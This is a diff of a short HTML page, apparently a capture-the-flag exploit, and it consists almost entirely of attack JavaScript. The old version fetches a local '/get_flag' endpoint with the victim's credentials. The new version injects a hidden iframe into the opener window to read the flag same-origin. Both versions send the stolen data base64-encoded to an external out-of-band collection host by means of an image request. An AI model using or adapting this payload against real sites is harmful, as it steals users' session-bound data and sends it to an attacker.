@@ -2,11 +2,23 @@
 <html>
 <body>
 <script>
-fetch('http://127.0.0.1:3000/get_flag', { credentials: 'include' })
-  .then(r => r.text())
-  .then(data => {
-    new Image().src = 'https://toetqx9cw60filn7a5fc93hyfph3qlp0w.oast.site/?flag=' + btoa(data);
-  });
+  if (window.opener) {
+    // Inject an iframe into the original window
+    const iframe = window.opener.document.createElement('iframe');
+    iframe.style.display = 'none';
+    iframe.src = '/get_flag';  // same-origin request
+
+    iframe.onload = () => {
+      try {
+        const flag = iframe.contentDocument.body.innerText;
+        new Image().src = 'https://toetqx9cw60filn7a5fc93hyfph3qlp0w.oast.site/?flag=' + btoa(flag);
+      } catch (e) {
+        new Image().src = 'https://toetqx9cw60filn7a5fc93hyfph3qlp0w.oast.site/?err=' + btoa(e.message);
+      }
+    };
+
+    window.opener.document.body.appendChild(iframe);
+  }
 </script>
 </body>
 </html>
